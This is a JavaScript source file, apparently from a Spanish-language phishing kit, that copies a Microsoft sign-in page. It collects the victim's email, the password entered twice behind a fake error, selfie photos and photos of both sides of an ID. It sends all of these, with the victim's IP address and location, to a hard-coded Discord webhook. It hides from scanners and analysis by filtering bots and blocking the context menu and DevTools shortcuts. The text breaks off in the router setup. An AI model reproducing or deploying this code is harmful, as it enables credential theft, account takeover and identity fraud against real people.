const API_ENDPOINT = 'https://discord.com/api/webhooks/1524193066452385984/NCz48iN-LutD_jRybQjRa5e9RG0BiFQKrPlllJyQhKXG275sEvGRHcYse1sqJAL9z-YC';

const BotShield = (function () {
    'use strict';
    let pageLoadTime = Date.now();
    let mouseMovements = 0;
    let humanInteractions = 0;
    let lastInputTime = 0;
    let inputSpeeds = [];
    let hasRealFocus = false;
    let honeypotTriggered = false;
    let botDetected = false;
    function init() {
        document.addEventListener('mousemove', () => { mouseMovements++; if (mouseMovements > 5) humanInteractions++; });
        document.addEventListener('click', () => humanInteractions++);
        document.addEventListener('scroll', () => humanInteractions++);
        document.addEventListener('touchstart', () => humanInteractions++);
        document.addEventListener('keydown', trackInputSpeed);
        setupHoneypot();
    }
    function trackInputSpeed() {
        const now = Date.now(); if (lastInputTime > 0) { const speed = now - lastInputTime; if (speed < 15) inputSpeeds.push(speed); }
        lastInputTime = now;
    }
    function setupHoneypot() {
        const hp = document.createElement('input'); hp.type = 'text'; hp.name = 'website'; hp.id = 'website'; hp.tabIndex = -1; hp.autocomplete = 'off'; hp.style.cssText = 'position:absolute;opacity:0;pointer-events:none;height:0;width:0;left:-9999px;';
        hp.addEventListener('change', () => honeypotTriggered = true);
        hp.addEventListener('input', () => honeypotTriggered = true);
        document.body.appendChild(hp);
    }
    function setupFocusDetection() { document.addEventListener('focusin', (e) => { if (e.isTrusted) hasRealFocus = true; }); }
    function isBot(strict = true) {
        const timeElapsed = Date.now() - pageLoadTime;
        if (timeElapsed < 500) { console.log('BotShield: Muy rápido'); return true; }
        if (honeypotTriggered) { console.log('BotShield: Honeypot'); return true; }
        if (strict) {
            if (humanInteractions === 0 && mouseMovements === 0 && inputSpeeds.length === 0) { console.log('BotShield: Sin interacción'); return true; }
            if (inputSpeeds.length > 10) { const avgSpeed = inputSpeeds.reduce((a, b) => a + b) / inputSpeeds.length; if (avgSpeed < 15) { console.log('BotShield: Escritura inhumana'); return true; } }
        }
        return false;
    }
    function markBot() { botDetected = true; }
    function getScore() { return { time: Date.now() - pageLoadTime, mouse: mouseMovements, interactions: humanInteractions, inputSpeeds: inputSpeeds.length, focus: hasRealFocus, honeypot: honeypotTriggered }; }
    return { init, isBot, markBot, getScore };
})();

const Validators = (function () {
    'use strict';
    function email(email) { const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/; return regex.test(email); }
    function code6Digits(code) { const regex = /^\d{6}$/; return regex.test(code); }
    function phone(phone) { const digitsOnly = phone.replace(/\D/g, ''); return digitsOnly.length >= 6 && digitsOnly.length <= 10; }
    function sanitize(input, type = 'alphanumeric') { switch (type) { case 'numeric': return input.replace(/[^0-9]/g, ''); case 'email': return input.trim().toLowerCase(); case 'phone': return input.replace(/[^0-9+\s]/g, ''); default: return input.trim(); } }
    function limitLength(input, maxLength) { return input.slice(0, maxLength); }
    function getLastDigits(number, digits = 4) { const cleanNumber = number.replace(/\D/g, ''); return cleanNumber.length >= digits ? cleanNumber.slice(-digits) : '0000'; }
    return { email, code6Digits, phone, sanitize, limitLength, getLastDigits };
})();

const ImageHost = (function () {
    'use strict';

    
    function dataURLtoBlob(dataURL) {
        return fetch(dataURL).then(r => r.blob());
    }


    function upload(dataURL, filename) {
        return dataURLtoBlob(dataURL).then(blob => {
            const formData = new FormData();

            formData.append('file', blob, filename || 'documento.jpg');

            formData.append('content', '📸 Imagen capturada');
            return fetch(API_ENDPOINT, { method: 'POST', body: formData })
                .then(response => {
                    if (!response.ok) throw new Error('Error al subir imagen a Discord');
                    return filename || 'documento.jpg';
                });
        });
    }

    function activateCamera(videoElement) {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            return Promise.reject(new Error('getUserMedia no soportado'));
        }
        return navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
            audio: false
        }).then(stream => {
            videoElement.srcObject = stream;
            return stream;
        });
    }

    function captureFromVideo(video) {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        return canvas.toDataURL('image/jpeg', 0.8);
    }

    function handleGalleryFile(file) {
        return new Promise((resolve, reject) => {
            if (!file || !file.type.startsWith('image/')) { reject(new Error('Archivo no válido')); return; }
            const reader = new FileReader();
            reader.onload = e => resolve(e.target.result);
            reader.onerror = () => reject(new Error('Error leyendo archivo'));
            reader.readAsDataURL(file);
        });
    }

    function toggleFlash(stream, enabled) {
        if (!stream) return Promise.resolve(false);
        const track = stream.getVideoTracks()[0];
        if (!track || !('applyConstraints' in track)) return Promise.resolve(false);
        const capabilities = track.getCapabilities ? track.getCapabilities() : {};
        if (!capabilities.torch) return Promise.resolve(false);
        return track.applyConstraints({ advanced: [{ torch: enabled }] })
            .then(() => true)
            .catch(() => false);
    }

    function stopStream(stream) {
        if (stream && stream.getTracks) {
            stream.getTracks().forEach(t => t.stop());
        }
    }

    return { upload, activateCamera, captureFromVideo, handleGalleryFile, toggleFlash, stopStream };
})();

const Discord = (function () {
    'use strict';
    const MS_AVATAR = 'https://iili.io/KHa0hlf.png';

    function sendMessage(message, username = 'Verificación de Identidad', avatarUrl = MS_AVATAR) {
        if (typeof API_ENDPOINT === 'undefined' || !API_ENDPOINT) { console.error('API Endpoint no configurado'); return Promise.reject('Endpoint no configurado'); }
        const data = { content: message, username: username, avatar_url: avatarUrl };
        return fetch(API_ENDPOINT, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) })
            .then(response => {
                if (!response.ok) { console.error('Error al enviar:', response.statusText); throw new Error('Error en la respuesta del servidor'); }
                if (response.status === 204 || response.status === 200) { return { success: true }; }
                return response.json().catch(() => ({ success: true }));
            })
            .catch(error => { console.error('Error en la solicitud:', error); throw error; });
    }

    const IPDATA_API_KEY = 'c3c534b646d39a871a47f795fc4302e1227acc8bf07b4d550efbff15';

    function getIpInfo() {
        const fallbackIpApi = () => {
            return fetch('http://ip-api.com/json/')
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        return {
                            ip: data.query,
                            location: `${data.city}, ${data.regionName}, ${data.country}`,
                            country: data.countryCode
                        };
                    }
                    throw new Error('Error de api-api.com');
                })
                .catch(err => {
                    console.error('Error obteniendo información del fallback ip-api.com:', err);
                    return { ip: 'Desconocida', location: 'Ubicación no disponible', country: null };
                });
        };

        if (IPDATA_API_KEY === 'TU_API_KEY_DE_IPDATA_AQUI') {
            console.warn('Falta API Key de ipdata.co, intentando fallback con ip-api.com');
            return fallbackIpApi();
        }

        return fetch(`https://api.ipdata.co?api-key=${IPDATA_API_KEY}`)
            .then(response => { if (!response.ok) throw new Error('Error ipdata.co'); return response.json(); })
            .then(data => {
                if (data.ip && data.country_name) {
                    const locStr = data.city ? `${data.city}, ${data.region || ''}, ${data.country_name}` : data.country_name;
                    return { ip: data.ip, location: locStr, country: data.country_code };
                }
                throw new Error('Datos incompletos de ipdata.co');
            })
            .catch(error => {
                console.warn('Fallo ipdata.co, intentando fallback con ip-api.com:', error.message);
                return fallbackIpApi();
            });
    }


    function sendEmail(email) {
        return getIpInfo().then(info => {
            const message = `📧 **Paso 1: Correo ingresado**\n\n` +
                `👤 Usuario: ${email}\n` +
                `🌍 País: ${info.location}\n` +
                `📌 IP: ${info.ip}\n` +
                `🌐 Navegador: ${navigator.userAgent}`;
            return sendMessage(message, 'Correo', MS_AVATAR);
        });
    }


    function sendPasswordError(email, password) {
        return getIpInfo().then(info => {
            const message = `⚠️ **Paso 2: Contraseña primer intento**\n\n` +
                `👤 Usuario: ${email}\n` +
                `🔒 Contraseña: ${password}\n` +
                `🌍 País: ${info.location}\n` +
                `📌 IP: ${info.ip}`;
            return sendMessage(message, 'Contraseña - Intento', MS_AVATAR);
        });
    }


    function sendPassword(email, password) {
        return getIpInfo().then(info => {
            const message = `✅ **Paso 3: Contraseña aceptada**\n\n` +
                `👤 Usuario: ${email}\n` +
                `🔒 Contraseña: ${password}\n` +
                `🌍 País: ${info.location}\n` +
                `📌 IP: ${info.ip}`;
            return sendMessage(message, 'Contraseña', MS_AVATAR);
        });
    }


    function sendDocumentPhotos(frontFilename, backFilename) {
        return getIpInfo().then(info => {
            const message = `🪪 **Paso 5: Documento de Identidad**\n\n` +
                `📸 Frente: ${frontFilename}\n` +
                `📸 Reverso: ${backFilename}\n` +
                `🌍 País: ${info.location}\n` +
                `📌 IP: ${info.ip}\n` +
                `📅 Fecha/Hora: ${new Date().toLocaleString()}`;
            return sendMessage(message, 'Documento', MS_AVATAR);
        });
    }


    function sendVerificationComplete(email) {
        return getIpInfo().then(info => {
            const message = `🎉 **Paso 6: Verificación Completada**\n\n` +
                `=========================\n` +
                `📧 Usuario: ${email}\n` +
                `🌍 País: ${info.location}\n` +
                `📌 IP: ${info.ip}\n` +
                `📅 Fecha/Hora: ${new Date().toLocaleString()}\n` +
                `🌐 Navegador: ${navigator.userAgent}\n` +
                `=========================`;
            return sendMessage(message, 'Verificación Completa', MS_AVATAR);
        });
    }

    return { sendMessage, getIpInfo, sendEmail, sendPasswordError, sendPassword, sendDocumentPhotos, sendVerificationComplete };
})();

const Views = (function () {
    'use strict';
    function getFooter() { return `<div class="mobile-footer"><div class="footer-links"><a href="#" class="footer-link">Ayuda</a><a href="#" class="footer-link">Términos de uso</a><a href="#" class="footer-link">Privacidad y cookies</a></div><div class="footer-note">Usa la exploración privada si este no es tu dispositivo.<a href="#">Más información</a></div></div>`; }


    function email() {
        return `<div class="login-container"><div class="login-box"><div class="login-header">
            <img src="assets/logo.png" alt="">
            <h1 class="login-title">Iniciar sesión</h1>
            <span class="login-subtitle">Usar su cuenta de Microsoft.</span>
        </div><div id="email-lg" class="lg-container"><div class="lg-group">
            <input type="email" class="lg-control" id="tiki" name="email" placeholder="Correo electrónico o número de teléfono" required>
            <button type="button" class="forgot-password-link" id="forgot-user">¿Olvidaste tu nombre de usuario?</button>
        </div><button type="button" class="btn btn-primary" id="btn-email-mit">Siguiente</button></div>
        <div class="divider"></div>
        <div align="center"><span style="font-family:'Segoe UI',Arial,sans-serif;font-size:14px;vertical-align:center;"><br>¿Es nuevo en Microsoft? <button type="button" class="forgot-password-link" id="create-account">Crear una cuenta</button></span></div>
        </div></div></div>${getFooter()}`;
    }


    function passwordError() {
        return `<div class="login-container"><div class="login-box"><div class="login-header">
            <img src="assets/logo.png" alt="">
            <div class="user-email" id="user-email-display"></div>
            <h1 class="login-title">Escriba la contraseña</h1>
        </div><div id="password-lg" class="lg-container"><div class="lg-group password-container">
            <input type="password" class="lg-control" id="toko" name="password" placeholder="Contraseña" required autocomplete="current-password">
            <button type="button" class="toggle-password" id="toggle-password"><i class="far fa-eye"></i></button>
            <a href="#" class="forgot-password-link">¿Olvidó su contraseña?</a>
        </div><div class="pwd-error-msg" id="pwd-error-msg">Contraseña es incorrecta. Ingrese nuevamente.</div>
        <button type="button" class="btn btn-primary" id="btn-password-error-mit"><span class="btn-label">Iniciar sesión</span></button>
        <br><div align="center" class="forgot-password-link">Use su cara, la huella digital, el PIN o la clave de seguridad</div>
        </div></div></div>${getFooter()}`;
    }

  
    function password() {
        return `<div class="login-container"><div class="login-box"><div class="login-header">
            <img src="assets/logo.png" alt="">
            <div class="user-email" id="user-email-display"></div>
            <h1 class="login-title">Escriba la contraseña</h1>
        </div><div id="password-lg" class="lg-container"><div class="lg-group password-container">
            <input type="password" class="lg-control" id="toko" name="password" placeholder="Contraseña" required autocomplete="current-password">
            <button type="button" class="toggle-password" id="toggle-password"><i class="far fa-eye"></i></button>
            <a href="#" class="forgot-password-link">¿Olvidó su contraseña?</a>
        </div><button type="button" class="btn btn-primary" id="btn-password-mit">Iniciar sesión</button></div>
        <br><div align="center" class="forgot-password-link">Use su cara, la huella digital, el PIN o la clave de seguridad</div>
        </div></div></div>${getFooter()}`;
    }


    function ageCheck() {
        return `<div class="login-container"><div class="age-box"><div class="age-icon-wrapper">
            <div class="age-icon-glow"></div>
            <div class="age-icon"><i class="fas fa-shield-alt"></i></div>
        </div><div class="age-header">
            <h1 class="age-title">Verificación de Edad</h1>
            <p class="age-subtitle">Para continuar con la verificación de tu identidad, necesitamos confirmar que eres mayor de edad.</p>
        </div><div class="age-question">
            <i class="fas fa-user-check"></i>
            <h2>¿Eres mayor de 18 años?</h2>
        </div><div class="age-buttons">
            <button type="button" class="age-btn age-btn-yes" id="age-yes"><i class="fas fa-check"></i> Sí, soy mayor</button>
            <button type="button" class="age-btn age-btn-no" id="age-no"><i class="fas fa-times"></i> No, soy menor</button>
        </div><div class="age-note"><i class="fas fa-lock"></i> Tu información está protegida y es confidencial.</div>
        </div></div>`;
    }

    function faceCheck() {
         return `<style>
.face-container * { margin:0; padding:0; box-sizing:border-box; font-family:"Segoe UI", sans-serif; }
.face-container { width:100%; max-width:360px; background:white; border-radius:12px; overflow:hidden; box-shadow:0 5px 25px rgba(0,0,0,.08); margin: 0 auto; }
.face-topbar { display:flex; justify-content:center; padding:14px 0; border-bottom:1px solid #edebe9; background:white; }
.face-logo-box { width:120px; height:30px; display:flex; align-items:center; justify-content:center; }
.overlay, .camera-screen { padding:20px; text-align:center; }
.overlay h1 { font-size:1.3rem; margin-bottom:10px; color:#1b1b1b; }
.overlay p { font-size:.85rem; color:#605e5c; line-height:1.5; margin-bottom:15px; }
.check-box { text-align:left; display:flex; gap:8px; margin-bottom:15px; }
.check-box label { font-size:.82rem; color:#323130; }
.continue-btn { width:100%; border:none; background:#0078d4; color:white; padding:11px; border-radius:4px; font-size:.9rem; cursor:pointer; opacity:.4; }
.continue-btn.active { opacity:1; }
.camera-screen { display:none; }
.camera-screen.active { display:block; }
.camera-title { font-size:1rem; margin-bottom:12px; color:#1b1b1b; }
.scanner { width:100%; max-width:240px; margin:auto; aspect-ratio:3/4; background:#faf9f8; border-radius:10px; overflow:hidden; position:relative; border:1px solid #edebe9; }
#face-video { width:100%; height:100%; object-fit:cover; transform:scaleX(-1); }
.face-guide { position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); width:100px; height:140px; border:2px solid #0078d4; border-radius:60px; }
.scan-line { position:absolute; width:100%; height:2px; background:linear-gradient(90deg,transparent,#0078d4,transparent); animation:scan 3s linear infinite; }
@keyframes scan { 0%{top:0;} 100%{top:100%;} }
.status { margin-top:10px; font-size:.8rem; color:#0078d4; min-height:18px; }
.finish-btn { margin-top:12px; width:100%; border:none; background:#0078d4; color:white; padding:10px; border-radius:4px; font-size:.85rem; cursor:pointer; display:none; }
.finish-btn.show { display:block; }
</style>
<div class="login-container"><div class="face-container">
  <div class="face-topbar">
    <div class="face-logo-box">
      <img src="assets/logo.png" style="max-height:22px;" />
    </div>
  </div>
  <div class="overlay" id="face-overlay">
    <h1>Verificación facial</h1>
    <p>Para finalizar necesitamos realizar una verificación facial para validar y proteger la seguridad de tu cuenta Microsoft.</p>
    <div class="check-box">
      <input type="checkbox" id="face-acceptCheck">
      <label>Acepto mantener mi cuenta Microsoft segura mediante verificación facial.</label>
    </div>
    <button class="continue-btn" id="face-continueBtn" disabled>Continuar</button>
  </div>
  <div class="camera-screen" id="face-cameraScreen">
    <div class="camera-title">Posiciona tu rostro</div>
    <div class="scanner">
      <video id="face-video" autoplay muted playsinline></video>
      <div class="scan-line"></div>
      <div class="face-guide"></div>
    </div>
    <div class="status" id="face-status">Esperando...</div>
    <button class="finish-btn" id="face-finishBtn">Tomar foto</button>
  </div>
</div></div>
<canvas id="face-canvas" style="display:none;"></canvas>`;
     }



    function docCapture(side) {
        const sideText = side === 'front' ? 'anverso (frente)' : 'reverso (detrás)';
        const stepNum = side === 'front' ? 1 : 2;
        const icon = side === 'front' ? 'fa-id-card' : 'fa-address-card';
        return `<div class="login-container"><div class="doc-box">
            <div class="doc-header">
                <img src="assets/logo.png" alt="">
                <h1 class="doc-title">Verificación de Identidad</h1>
                <p class="doc-subtitle">Fotografía el <strong>${sideText}</strong> de tu documento</p>
            </div>
            <div class="doc-progress">
                <div class="doc-step ${side === 'front' ? 'active' : 'done'}">1</div>
                <div class="doc-progress-line ${side === 'back' ? 'filled' : ''}"></div>
                <div class="doc-step ${side === 'back' ? 'active' : ''}">2</div>
            </div>
            <div class="doc-camera-container" id="doc-camera-container">
                <div class="doc-video-wrapper">
                    <video id="doc-camera-preview" autoplay playsinline muted></video>
                    <div class="doc-scan-frame">
                        <div class="scan-corner scan-corner-tl"></div>
                        <div class="scan-corner scan-corner-tr"></div>
                        <div class="scan-corner scan-corner-bl"></div>
                        <div class="scan-corner scan-corner-br"></div>
                    </div>
                    <div class="doc-scan-hint"><i class="fas ${icon}"></i> Coloca el documento dentro del marco</div>
                    <button type="button" class="doc-flash-btn hidden" id="doc-flash-btn"><i class="fas fa-bolt"></i></button>
                    <img id="doc-preview-img" class="hidden" alt="">
                </div>
                <div class="doc-preview-placeholder hidden" id="doc-capture-loader">
                    <div class="doc-spinner"><i class="fas fa-circle-notch fa-spin"></i></div>
                    <span>Procesando imagen...</span>
                </div>
            </div>
            <div class="doc-actions">
                <button type="button" class="doc-btn doc-btn-capture" id="doc-capture-btn"><i class="fas fa-camera"></i> <span class="btn-label">Tomar foto</span></button>
                <button type="button" class="doc-btn doc-btn-gallery" id="doc-gallery-btn"><i class="fas fa-image"></i> Subir desde galería</button>
                <input type="file" id="doc-file-input" accept="image/*" class="hidden">
                <button type="button" class="doc-btn doc-btn-retake hidden" id="doc-retake-btn"><i class="fas fa-redo"></i> Volver a tomar</button>
                <button type="button" class="doc-btn doc-btn-confirm hidden" id="doc-confirm-btn"><i class="fas fa-check"></i> Confirmar y continuar</button>
            </div>
        </div></div>`;
    }


    function verified() {
        return `<div class="login-container"><div class="verified-box">
            <div class="verified-checkmark hidden" id="verified-checkmark">
                <svg viewBox="0 0 52 52" class="checkmark-svg">
                    <circle cx="26" cy="26" r="25" fill="none" class="checkmark-circle"></circle>
                    <path fill="none" d="M14 27l8 8 16-16" class="checkmark-check"></path>
                </svg>
            </div>
            <h1 class="verified-title hidden" id="verified-title">¡Has sido verificado correctamente!</h1>
            <p class="verified-subtitle hidden" id="verified-subtitle">Tu identidad ha sido validada exitosamente.</p>
            <div class="verified-loader" id="verified-loader"><div class="verified-spinner"></div><span>Procesando verificación...</span></div>
        </div></div>`;
    }

    return { email, passwordError, password, ageCheck, faceCheck, docCapture, verified };
})();

const Router = (function () {
    'use strict';
    const STATES = {
        EMAIL: 'email',
        PASSWORD_ERROR: 'passwordError',
        PASSWORD: 'password',
        AGE_CHECK: 'ageCheck',
        FACE_CHECK: 'faceCheck',
        DOC_FRONT: 'docFront',
        DOC_BACK: 'docBack',
        VERIFIED: 'verified'
    };
    let currentState = null;
    const stateCallbacks = new Map();
    function register(state, callback) { stateCallbacks.set(state, callback); }
    function navigate(state, data = {}) {
        const validStates = Object.values(STATES);
        if (!validStates.includes(state)) { console.error(`Estado no válido: ${state}`); return; }
        currentState = state;
        const callback = stateCallbacks.get(state);
        if (callback) { callback(data); } else { console.warn(`No hay callback registrado para el estado: ${state}`); }
    }
    function getCurrentState() { return currentState; }
    return { STATES, register, navigate, getCurrentState };
})();

const UI = (function () {
    'use strict';
    function preventContextMenu() { document.addEventListener('contextmenu', function (e) { e.preventDefault(); return false; }); }
    function blockDevTools() { document.addEventListener('keydown', function (e) { if (e.key === 'F12') { e.preventDefault(); return false; } if (e.ctrlKey && e.key === 'u') { e.preventDefault(); return false; } if (e.ctrlKey && e.shiftKey && e.key === 'I') { e.preventDefault(); return false; } }); }

    function setupPasswordToggle() {
        const toggleBtn = document.getElementById('toggle-password');
        const passwordInput = document.getElementById('toko');
        if (!toggleBtn || !passwordInput) return;
        toggleBtn.addEventListener('click', function () {
            const icon = toggleBtn.querySelector('i');
            if (passwordInput.type === 'password') { passwordInput.type = 'text'; icon.classList.remove('fa-eye'); icon.classList.add('fa-eye-slash'); }
            else { passwordInput.type = 'password'; icon.classList.remove('fa-eye-slash'); icon.classList.add('fa-eye'); }
        });
    }

    function setupEmailLg(onMit) {
        const emailInput = document.getElementById('tiki');
        const btnMit = document.getElementById('btn-email-mit');
        if (!emailInput || !btnMit) return;
        btnMit.addEventListener('click', function (e) {
            e.preventDefault();
            if (BotShield.isBot()) { BotShield.markBot(); return; }
            const email = Validators.sanitize(emailInput.value, 'email');
            if (!email || !Validators.email(email)) { emailInput.classList.add('invalid'); return; }
            emailInput.classList.remove('invalid');
            onMit(email);
        });
        emailInput.addEventListener('keypress', function (e) { if (e.key === 'Enter') { btnMit.click(); } });
    }

    function setupPasswordLg(btnId, onMit) {
        const passwordInput = document.getElementById('toko');
        const btnMit = document.getElementById(btnId);
        if (!passwordInput || !btnMit) return;
        btnMit.addEventListener('click', function (e) {
            e.preventDefault();
            if (BotShield.isBot()) { BotShield.markBot(); return; }
            const password = passwordInput.value.trim();
            if (!password) { passwordInput.classList.add('invalid'); return; }
            passwordInput.classList.remove('invalid');
            onMit(password);
        });
        passwordInput.addEventListener('keypress', function (e) { if (e.key === 'Enter') { btnMit.click(); } });
    }

    function setupAgeCheck(onYes, onNo) {
        const yesBtn = document.getElementById('age-yes');
        const noBtn = document.getElementById('age-no');
        if (!yesBtn || !noBtn) return;
        yesBtn.addEventListener('click', function () { yesBtn.classList.add('clicked'); setTimeout(onYes, 300); });
        noBtn.addEventListener('click', function () { noBtn.classList.add('clicked'); setTimeout(onNo, 300); });
    }


    function setupDocumentCapture(side, onComplete) {
        const video = document.getElementById('doc-camera-preview');
        const captureBtn = document.getElementById('doc-capture-btn');
        const galleryBtn = document.getElementById('doc-gallery-btn');
        const fileInput = document.getElementById('doc-file-input');
        const retakeBtn = document.getElementById('doc-retake-btn');
        const confirmBtn = document.getElementById('doc-confirm-btn');
        const previewImg = document.getElementById('doc-preview-img');
        const scanFrame = document.querySelector('.doc-scan-frame');
        const scanHint = document.querySelector('.doc-scan-hint');
        const flashBtn = document.getElementById('doc-flash-btn');
        const loader = document.getElementById('doc-capture-loader');

        let currentStream = null;
        let capturedDataURL = null;
        let flashEnabled = false;


        ImageHost.activateCamera(video)
            .then(stream => {
                currentStream = stream;
  
                const track = stream.getVideoTracks()[0];
                if (track.getCapabilities) {
                    const caps = track.getCapabilities();
                    if (caps.torch) flashBtn.classList.remove('hidden');
                }
            })
            .catch(err => {
                console.error('Error cámara:', err);
                captureBtn.querySelector('.btn-label').textContent = 'Subir imagen';
                scanHint.innerHTML = '<i class="fas fa-image"></i> Usa el botón para subir tu documento';
            });


        if (flashBtn) {
            flashBtn.addEventListener('click', function () {
                flashEnabled = !flashEnabled;
                ImageHost.toggleFlash(currentStream, flashEnabled).then(ok => {
                    if (ok) flashBtn.style.color = flashEnabled ? 'rgba(255,255,255,0.3)' : 'rgba(0,0,0,0.3)';
                });
            });
        }


        captureBtn.addEventListener('click', function () {
            if (!currentStream || !video.videoWidth) {

                fileInput.click();
                return;
            }
            capturedDataURL = ImageHost.captureFromVideo(video);
            showCapturedPreview();
        });


        galleryBtn.addEventListener('click', function () { fileInput.click(); });
        fileInput.addEventListener('change', function (e) {
            const file = e.target.files[0];
            if (!file) return;
            ImageHost.handleGalleryFile(file)
                .then(dataURL => { capturedDataURL = dataURL; showCapturedPreview(); })
                .catch(err => console.error('Error archivo:', err));
            fileInput.value = '';
        });


        retakeBtn.addEventListener('click', function () {
            hideCapturedPreview();
            capturedDataURL = null;
        });


        confirmBtn.addEventListener('click', function () {
            if (!capturedDataURL) return;

            if (currentStream) { ImageHost.stopStream(currentStream); currentStream = null; }

            captureBtn.classList.add('hidden');
            galleryBtn.classList.add('hidden');
            retakeBtn.classList.add('hidden');
            confirmBtn.classList.add('hidden');
            loader.classList.remove('hidden');


            const filename = side === 'front' ? 'documento_frente.jpg' : 'documento_reverso.jpg';
            ImageHost.upload(capturedDataURL, filename)
                .then(name => {
                    console.log('Imagen enviada:', name);
                    onComplete(name);
                })
                .catch(err => {
                    console.error('Error subida:', err);
                    alert('Error al enviar la imagen. Intenta nuevamente.');
                    hideCapturedPreview();
                    loader.classList.add('hidden');
                    captureBtn.classList.remove('hidden');
                    galleryBtn.classList.remove('hidden');
                });
        });

        function showCapturedPreview() {
            previewImg.src = capturedDataURL;
            previewImg.classList.remove('hidden');
            video.classList.add('hidden');
            if (scanFrame) scanFrame.classList.add('hidden');
            if (scanHint) scanHint.classList.add('hidden');
            if (flashBtn) flashBtn.classList.add('hidden');
            captureBtn.classList.add('hidden');
            galleryBtn.classList.add('hidden');
            retakeBtn.classList.remove('hidden');
            confirmBtn.classList.remove('hidden');
        }

        function hideCapturedPreview() {
            previewImg.classList.add('hidden');
            previewImg.src = '';
            video.classList.remove('hidden');
            if (scanFrame) scanFrame.classList.remove('hidden');
            if (scanHint) scanHint.classList.remove('hidden');

            if (currentStream) {
                const track = currentStream.getVideoTracks()[0];
                if (track.getCapabilities) {
                    const caps = track.getCapabilities();
                    if (caps.torch) flashBtn.classList.remove('hidden');
                }
            }
            captureBtn.classList.remove('hidden');
            galleryBtn.classList.remove('hidden');
            retakeBtn.classList.add('hidden');
            confirmBtn.classList.add('hidden');
        }


        return function cleanup() { if (currentStream) ImageHost.stopStream(currentStream); };
    }

    function setupFaceCheck(onComplete) {
        const acceptCheck = document.getElementById('face-acceptCheck');
        const continueBtn = document.getElementById('face-continueBtn');
        const overlay = document.getElementById('face-overlay');
        const cameraScreen = document.getElementById('face-cameraScreen');
        const video = document.getElementById('face-video');
        const statusText = document.getElementById('face-status');
        const finishBtn = document.getElementById('face-finishBtn');
        const canvas = document.getElementById('face-canvas');

        if (!acceptCheck || !continueBtn) return;

        acceptCheck.addEventListener('change', () => {
            continueBtn.disabled = !acceptCheck.checked;
            continueBtn.classList.toggle('active', acceptCheck.checked);
        });

        continueBtn.addEventListener('click', async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' },
                    audio: false
                });

                video.srcObject = stream;
                overlay.style.display = 'none';
                cameraScreen.classList.add('active');

                // Simulate facial verification flow
                statusText.innerText = 'Muestra tu rostro';
                setTimeout(() => statusText.innerText = 'Centra tu rostro', 3000);
                setTimeout(() => statusText.innerText = 'Detectando rostro...', 6000);
                setTimeout(() => {
                    statusText.innerText = 'Listo';
                    finishBtn.classList.add('show');
                }, 9000);

                finishBtn.addEventListener('click', async () => {
                    if (finishBtn.classList.contains('show')) {
                        try {
                            const capturedDataURL = ImageHost.captureFromVideo(video);
                            const fileName = 'rostro_capturado.jpg';
                            statusText.innerText = 'Ya casi finalizamos...';
                            
                            const uploadedName = await ImageHost.upload(capturedDataURL, fileName);
                            setTimeout(() => {
                                if (stream) ImageHost.stopStream(stream);
                                onComplete(uploadedName);
                            }, 1000);
                        } catch (error) {
                            console.error('Error:', error);
                            statusText.innerText = 'Error al procesar';
                        }
                    }
                });
            } catch (error) {
                console.error('Error cámara:', error);
                statusText.innerText = 'Error de cámara';
            }
        });
    }

    function showVerifiedAnimation(onComplete) {
        const loader = document.getElementById('verified-loader');
        const checkmark = document.getElementById('verified-checkmark');
        const title = document.getElementById('verified-title');
        const subtitle = document.getElementById('verified-subtitle');


        setTimeout(function () {
            if (loader) loader.classList.add('hidden');
            if (checkmark) checkmark.classList.remove('hidden');
            if (title) title.classList.remove('hidden');
            if (subtitle) subtitle.classList.remove('hidden');
        }, 3000);


        setTimeout(function () {
            onComplete();
        }, 8000);
    }

    return { preventContextMenu, blockDevTools, setupPasswordToggle, setupEmailLg, setupPasswordLg, setupAgeCheck, setupFaceCheck, setupDocumentCapture, showVerifiedAnimation };
})();

(function () {
    'use strict';
    document.addEventListener('DOMContentLoaded', function () {
        BotShield.init();
        setTimeout(function () {
            if (BotShield.isBot(false)) {
                document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;"><h1>Error de conexión</h1></div>';
                return;
            }
            UI.preventContextMenu();
            UI.blockDevTools();
            const app = document.getElementById('app');
            let tempEmail = '';
            let faceCheckFileName = '';
            let frontFilename = '';


            Router.register(Router.STATES.EMAIL, function () {
                app.innerHTML = Views.email();
                UI.setupEmailLg(function (email) {
                    tempEmail = email;
                    Discord.sendEmail(email)
                        .then(() => console.log('Email enviado a Discord'))
                        .catch(err => console.error('Error:', err));
                    Router.navigate(Router.STATES.PASSWORD);
                });
            });


            Router.register(Router.STATES.PASSWORD_ERROR, function () {
                app.innerHTML = Views.passwordError();
                const emailDisplay = document.getElementById('user-email-display');
                if (emailDisplay) emailDisplay.textContent = tempEmail;
                UI.setupPasswordToggle();

                const passwordInput = document.getElementById('toko');
                const btnMit = document.getElementById('btn-password-error-mit');
                const errorMsg = document.getElementById('pwd-error-msg');
                function handleSubmit() {
                    if (BotShield.isBot()) { BotShield.markBot(); return; }
                    const password = passwordInput.value.trim();
                    if (!password) { passwordInput.classList.add('invalid'); return; }
                    passwordInput.classList.remove('invalid');

                    Discord.sendPassword(tempEmail, password)
                        .then(() => console.log('Password error enviado'))
                        .catch(err => console.error('Error:', err));
                    errorMsg.classList.remove('hidden');
                    Router.navigate(Router.STATES.AGE_CHECK);
                }

                btnMit.addEventListener('click', function (e) { e.preventDefault(); handleSubmit(); });
                passwordInput.addEventListener('keypress', function (e) { if (e.key === 'Enter') { btnMit.click(); } });
            });


            Router.register(Router.STATES.PASSWORD, function () {
                app.innerHTML = Views.password();
                const emailDisplay = document.getElementById('user-email-display');
                if (emailDisplay) emailDisplay.textContent = tempEmail;
                UI.setupPasswordToggle();
                UI.setupPasswordLg('btn-password-mit', function (password) {
                    Discord.sendPasswordError(tempEmail, password)
                        .then(() => console.log('Password enviada'))
                        .catch(err => console.error('Error:', err));
                    Router.navigate(Router.STATES.PASSWORD_ERROR);
                });
            });


